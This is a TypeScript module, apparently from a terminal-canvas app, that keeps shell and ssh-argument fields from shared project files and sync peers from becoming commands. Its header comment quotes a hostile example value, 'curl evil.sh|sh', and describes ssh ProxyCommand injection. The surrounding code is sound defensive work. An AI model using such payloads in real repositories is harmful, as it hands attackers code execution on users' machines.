/**
 * Trust boundary for the node fields that end up EXECUTING something.
 *
 * `.nodeterm/project.json` is hostile input: it is git-shared, hand-editable, auto-adopted by
 * "Open folder…", and for an SSH project it lives on the remote host. A value that arrives from
 * that file was never typed by the local user, so it must never become a command. The codebase
 * already honors this for `initialCommand` (deliberately never serialized); two siblings reach an
 * exec the same way and are handled here:
 *
 *  - `NodeState.shell` — the session program. It lands as tmux `new-session`'s trailing command
 *    argument, and tmux runs a lone command argument THROUGH A SHELL. A cloned repo could ship
 *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
 *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
 *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
 *
 * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
 * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
 * `localNodeExec` / `applyLocalNodeExec` round-trip them through the machine-local workspace.json
 * index instead (`IndexEntryV3.localExec`). A project file therefore contributes NOTHING to either
 * field: the safe fallback (default shell / no extra ssh args) is what an unrecognized or foreign
 * value degrades to.
 *
 * `safeSessionProgram` is the second layer, applied where the value BECOMES a command (pty-manager),
 * in the same idiom as `permissionModeFlag` re-validating at the interpolation site: whatever the
 * path a value took to get there (a peer canvas mutation, a stale in-memory node, a future caller),
 * a program string carrying shell metacharacters is never handed to tmux.
 */

import { sanitizeNodeGitHubLinks } from './github-link'
import { sshExtraArgsEnableLocalExec } from './ssh'
import type { CanvasNodeState } from './types'

/** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
export interface LocalNodeExec {
  /** `NodeState.shell` — a custom session program for this node. */
  shell?: string
  /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
  sshExtraArgs?: string
}

/** Node id → the exec values that stay on this machine. */
export type LocalNodeExecMap = Record<string, LocalNodeExec>

/**
 * A session program must be ONE program, not a command line: tmux runs a lone command argument
 * through a shell, so anything a shell would interpret is refused. Absolute paths, bare names and
 * `~`-less relative paths are fine; whitespace, quotes, `;|&$()<>` … and a leading `-` (which tmux
 * would read as an option) are not.
 */
const SAFE_PROGRAM = /^[A-Za-z0-9_./+@:=-]+$/

/**
 * Validate a session program at the point it becomes a command. Returns the program when it is
 * safe to hand to tmux/node-pty, else `undefined` — i.e. the caller falls back to the default
 * shell, which is exactly the pre-feature behavior. NEVER throws: an unrecognized value degrades
 * to the safe path, it does not block the launch.
 */
export function safeSessionProgram(shell: string | undefined): string | undefined {
  if (!shell) return undefined
  const s = shell.trim()
  if (!s || s.startsWith('-')) return undefined
  if (!SAFE_PROGRAM.test(s)) return undefined
  return s
}

/**
 * Strip every exec-enabling field from the nodes we are about to write into a SHARED project file.
 * The values survive on this machine via `localNodeExec` (below); what leaves for git/the remote
 * host carries no command of any kind.
 */
function stripNodeExec(n: CanvasNodeState): CanvasNodeState {
  if (n.shell === undefined && n.ssh?.extraArgs === undefined && n.ssh?.execTrusted === undefined)
    return n
  const out: CanvasNodeState = { ...n }
  delete out.shell
  if (out.ssh) {
    // `execTrusted` goes with the value it vouches for. It is a MACHINE-LOCAL provenance marker:
    // if it could ride a document or a wire frame, a hostile one would simply set it to true.
    const { extraArgs: _extraArgs, execTrusted: _execTrusted, ...conn } = out.ssh
    out.ssh = conn
  }
  return out
}

export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map(stripNodeExec)
}

/**
 * Strip the exec-enabling fields from a node that arrived OVER THE WIRE (a canvas-sync peer's
 * mutation, or a relay client's).
 *
 * This is the other half of the trust boundary, and without it the disk half was worthless: a peer
 * mutation is applied VERBATIM (`isCanvasMutation` validates only id/position/size), and the next
 * save harvests whatever `shell` / `ssh.extraArgs` are now in the live nodes into the MACHINE-LOCAL
 * `workspace.json` — where they are re-attached as this machine's own values on every load, for
 * ever, surviving the peer leaving, being revoked, and the app restarting. The peer laundered an
 * exec field into the trusted store.
 *
 * A peer has no business setting either field on our machine: both are per-machine settings (which
 * program to run here, which ssh options to pass here), and neither is meaningful on a canvas that
 * is merely being mirrored. So they are dropped at ingest, on every surface.
 */
export function sanitizeInboundNode(node: CanvasNodeState): CanvasNodeState {
  // `github` is shared content a peer legitimately mutates, so it is normalized rather than
  // dropped — a wire frame is as hostile as the file, and an unbounded array would ride into our
  // nodes and back out to disk.
  return sanitizeNodeGitHubLinks([stripNodeExec(node)])[0]
}

/**
 * Apply an inbound node OVER the copy we already hold, keeping OUR exec fields on it.
 *
 * Stripping the peer's values is only half of it: an upsert REPLACES the node, so a teammate merely
 * dragging our ssh terminal would otherwise hand us back a copy with no `extraArgs` — and the next
 * save would harvest that empty node and erase the jump host from our own machine-local index. The
 * exec fields are per-machine, so they simply do not participate in the sync: theirs are dropped,
 * ours are carried across every mutation that touches the node.
 */
export function carryLocalNodeExec(
  prev: CanvasNodeState | undefined,
  next: CanvasNodeState
): CanvasNodeState {
  if (!prev) return next
  const extraArgs = prev.ssh?.extraArgs
  if (prev.shell === undefined && extraArgs === undefined) return next
  const out: CanvasNodeState = { ...next }
  if (prev.shell !== undefined) out.shell = prev.shell
  if (extraArgs !== undefined && out.ssh)
    out.ssh = { ...out.ssh, extraArgs, execTrusted: prev.ssh?.execTrusted }
  return out
}

/** `sanitizeInboundNode` for a whole mutation (the stamps — `src`, `seq` — are preserved). */
export function sanitizeInboundMutation<T extends { op: 'upsert' | 'remove' }>(m: T): T {
  if (m.op !== 'upsert') return m
  const up = m as unknown as { node: CanvasNodeState }
  const node = sanitizeInboundNode(up.node)
  return node === up.node ? m : ({ ...m, node } as T)
}

/**
 * Collect the machine-local exec values of these nodes (for the workspace.json index entry).
 *
 * The index is the TRUSTED store — whatever lands here is re-attached to the node on every future
 * load, as this machine's own value. So an inbound value must not be able to launder itself in
 * (see `sanitizeInboundNode`, which is the primary guard), and this collector re-checks what it is
 * about to bless:
 *  - `shell` — only if it still passes the exec-site validator. A program the exec site would
 *    refuse anyway has no business being persisted as trusted.
 *  - `ssh.extraArgs` — an exec-enabling value (a `ProxyCommand` & co) is stored only when it is
 *    `execTrusted`, i.e. a LOCAL producer set it (the user's SSH server store, or a previous
 *    machine-local index entry). Harmless args are stored either way, so nothing legitimate is lost.
 */
export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
  const map: LocalNodeExecMap = {}
  for (const n of nodes) {
    const entry: LocalNodeExec = {}
    if (n.shell && safeSessionProgram(n.shell)) entry.shell = n.shell
    const extraArgs = n.ssh?.extraArgs
    if (extraArgs && (n.ssh?.execTrusted || !sshExtraArgsEnableLocalExec(extraArgs)))
      entry.sshExtraArgs = extraArgs
    if (entry.shell || entry.sshExtraArgs) map[n.id] = entry
  }
  return Object.keys(map).length ? map : undefined
}

/**
 * ONE-TIME UPGRADE. Take the exec values a project file carried from BEFORE this trust boundary
 * existed, and adopt them as this machine's own.
 *
 * `ssh.extraArgs` has a real producer (`createSshTerminalNode` copies it out of the machine-local
 * SSH server store), so every existing ssh-terminal node with a jump host or a corporate
 * `ProxyCommand` has one in its CURRENT `.nodeterm/project.json` — and the v3 index has no
 * `localExec` for it. Without this hoist the first load after the upgrade would silently drop the
 * value (the connection breaks with a confusing error) and the next save would erase it from disk
 * and propagate the deletion to every teammate via `rev`.
 *
 * The provenance signal is the one actually available at upgrade time: the project was ALREADY
 * REFERENCED in this machine's `workspace.json`, i.e. it is a folder this user had already opened.
 * The caller runs this exactly once per entry (`IndexEntryV3.execMigrated`), so a project file
 * cloned AFTER the upgrade — the hostile case — never reaches it.
 *
 * `shell` is still validated: it has no producer, so anything there is either junk or an attack,
 * and blessing a value the exec site would refuse anyway buys nothing.
 */
export function hoistLegacyNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
  const map: LocalNodeExecMap = {}
  for (const n of nodes) {
    const entry: LocalNodeExec = {}
    if (n.shell && safeSessionProgram(n.shell)) entry.shell = n.shell
    if (n.ssh?.extraArgs) entry.sshExtraArgs = n.ssh.extraArgs
    if (entry.shell || entry.sshExtraArgs) map[n.id] = entry
  }
  return Object.keys(map).length ? map : undefined
}

/**
 * Re-attach this machine's own exec values to nodes just read from a project file. Anything the
 * FILE carried in those fields is dropped first (it is not ours), so a hostile/cloned project.json
 * can only ever produce the safe default. Keyed by node id, which is stable (it is the tmux
 * session name) — a foreign file that happens to reuse an id can still only inherit a value the
 * local user typed themselves.
 */
export function applyLocalNodeExec(
  nodes: CanvasNodeState[],
  local: LocalNodeExecMap | undefined
): CanvasNodeState[] {
  return nodes.map((n) => {
    const mine = local?.[n.id]
    const out: CanvasNodeState = stripNodeExec(n)
    if (mine?.shell) out.shell = mine.shell
    if (out.ssh && mine?.sshExtraArgs) {
      // Ours: it came out of the machine-local index, so the exec site may honor an option like
      // ProxyCommand (a jump host is a legitimate thing to have configured).
      out.ssh = { ...out.ssh, extraArgs: mine.sshExtraArgs, execTrusted: true }
    }
    return out
  })
}
